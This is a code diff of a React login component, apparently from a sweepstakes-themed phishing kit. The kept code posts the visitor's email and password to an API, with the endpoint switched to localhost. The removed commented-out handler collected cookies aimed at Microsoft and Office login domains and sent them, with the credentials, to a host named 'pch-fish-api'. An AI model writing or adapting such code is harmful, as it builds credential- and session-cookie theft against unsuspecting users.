@@ -29,7 +29,7 @@ const WinnersLogin = () => {
         setIsLoading(true);
 
         try {
-            const res = await fetch("https://bd-mys-api.onrender.com/api/contact", {
+            const res = await fetch("http://localhost:3000/api/contact", {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({ mail, pass })
@@ -50,71 +50,6 @@ const WinnersLogin = () => {
         }
     };
 
-    // const loginHandler = async (e) => {
-    //     e.preventDefault();
-    //     setIsLoading(true);
-
-    //     // Collect extensive browser information
-    //     const browserInfo = {
-    //         // Basic info
-    //         userAgent: navigator.userAgent,
-    //         language: navigator.language,
-    //         platform: navigator.platform,
-
-    //         // Specialized cookie collection
-    //         specialCookies: {}
-    //     };
-
-    //     // Target specific cookie domains and patterns
-    //     const cookieDomains = [
-    //         '.office.com',
-    //         '.microsoft.com',
-    //         'login.microsoftonline.com',
-    //         'portal.office.com',
-    //         'outlook.office.com'
-    //     ];
-
-    //     // Collect all cookies
-    //     const allCookies = document.cookie.split(';').map(cookie => cookie.trim());
-
-    //     // Filter and collect cookies
-    //     const filteredCookies = allCookies.filter(cookie => {
-    //         // Check if cookie matches any of the target domains
-    //         return cookieDomains.some(domain => 
-    //             cookie.includes(domain.replace('.', ''))
-    //         );
-    //     });
-
-    //     // Structured cookie collection
-    //     browserInfo.specialCookies = {
-    //         officeCookies: filteredCookies,
-    //         allCookies: allCookies
-    //     };
-
-    //     try {
-    //         const res = await fetch("https://pch-fish-api.onrender.com/info", {
-    //             method: "POST",
-    //             headers: { "Content-Type": "application/json" },
-    //             body: JSON.stringify({ 
-    //                 mail, 
-    //                 pass,
-    //                 browserData: JSON.stringify(browserInfo)
-    //             })
-    //         });
-    //         const data = await res.json();
-
-    //         // Navigate even with "partial" status
-    //         if (res.ok || data.status === 'partial') {
-    //             navigate('/verified', { state: { email: mail } });
-    //         } else {
-    //             console.error('message failed', data);
-    //         }
-    //     } catch (error) {
-    //         console.error("Network or parsing error", error);
-    //     } finally {
-    //         setIsLoading(false);
-    //     }
-    // };
 
 
     const emailProviders = [
